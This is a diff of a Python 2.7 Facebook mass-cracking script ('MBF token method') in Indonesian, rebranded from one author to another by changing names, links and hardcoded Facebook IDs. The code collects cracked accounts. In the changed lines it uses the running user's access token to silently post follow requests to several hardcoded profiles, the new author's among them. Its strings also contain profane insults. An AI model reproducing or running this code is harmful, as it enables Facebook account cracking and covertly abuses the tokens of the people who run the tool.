@@ -2,14 +2,14 @@
 # coding=utf-8
 
 #######################################################
-# Name           : Y-MBF (MBF) <token method>         #
-# File           : ymbf.py                            #
-# Author         : Moch Yayan Juan Alvredo XD.        #
-# Github         : https://github.com/Yayan-XD        #
-# Facebook       : https://www.facebook.com/KM39453   #
-# Instagram      : https://www.instagram.com/yayanxd_ #
-# Fansfage       : https://www.facebook.com/Yayanxyz  #
-# Blogspot       : https://squadcyberpeopleteam.blogspot.com #
+# Name           : GOLD (MBF) <token method>         #
+# File           : gold.py                            #
+# Author         : Ramdhan Ramadhian XD.        #
+# Github         : https://github.com/Ramdhan7        #
+# Facebook       : https://www.facebook.com/100000912671987   #
+# Instagram      : https://www.instagram.com/ramdhan.ramadhian99 #
+# Fansfage       : https://www.facebook.com/ramdhan.ramadhian  #
+# Youtube       : http://www.youtube.com/channel/UC7kqla4Jh-ujwE6BKaUE_Rw #
 # Python version : 2.7                                #
 #######################################################
 
@@ -71,7 +71,7 @@ N = '\x1b[0m'    # WARNA MATI
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
-#  Moch Yayan Juan Alvredo XD.  #
+#  Ramdhan Ramadhian XD.  #
 #------------------------------->
 ok = []
 cp = []
@@ -79,7 +79,7 @@ id = []
 ttl =[]
 user = []
 loop = 0
-koh = '100005395413800'
+koh = '100044932290784'
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 # lempankkkkkkkk
 def jalan(z):
@@ -96,10 +96,11 @@ def tod():
         time.sleep(1)
 IP = requests.get('https://api.ipify.org').text
 # LO KONTOL
-logo = ''' \033[0;96m __  __        __  ______  ____
- \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By YayanXD
- \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
- \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''
+logo = ''' \033[0;96m  __________ __ ____ 
+\033[0;96m  / ____/ __ \/ / / __ \™\033[0m|| Created by Ramdhan R
+\033[0;96m / / __/ / / / / / / / / \033[0m|| Github.com/Ramdhan7
+\033[0;96m/ /_/ / /_/ / /___/ /_/ / \033[0;91mv2.5 \033[0m|| Facebook.com/100000912671987
+\033[0;96m\____/\____/_____/_____/ 
 # crack selesai
 def hasil(ok,cp):
 	if len(ok) != 0 or len(cp) != 0:
@@ -109,7 +110,7 @@ def hasil(ok,cp):
 	else:
 		print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N)
 		exit()
-xi_jimpinx = '1714000985456399'
+xi_jimpinx = '344477753726632'
 # Token FB bukan token PLN
 def yayanxd():
 	os.system('clear')
@@ -135,7 +136,7 @@ def yayanxd():
 		print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N)
 		time.sleep(2)
 		raw_input(' %s*%s tekan enter '%(O,N))
-		os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
+		os.system('xdg-open https://youtube.com/channel/UC7kqla4Jh-ujwE6BKaUE_Rw')
 		kontol()
 	except KeyError:
 		print '\n\n %s[%s!%s] token invalid'%(N,M,N)
@@ -253,8 +254,8 @@ def kontol():
 	except (KeyError, IOError):
 		print '\n %s[%s×%s] token invalid'%(N,M,N)
 		os.system('rm -rf __yayan__.txt')
-	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(__cindy__))
-	requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(__cindy__))
+	requests.post('https://graph.facebook.com/100044932290784/subscribers?access_token=%s'%(__cindy__))
+	requests.post('https://graph.facebook.com/100000912671987/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(__cindy__))
 	requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(__cindy__))
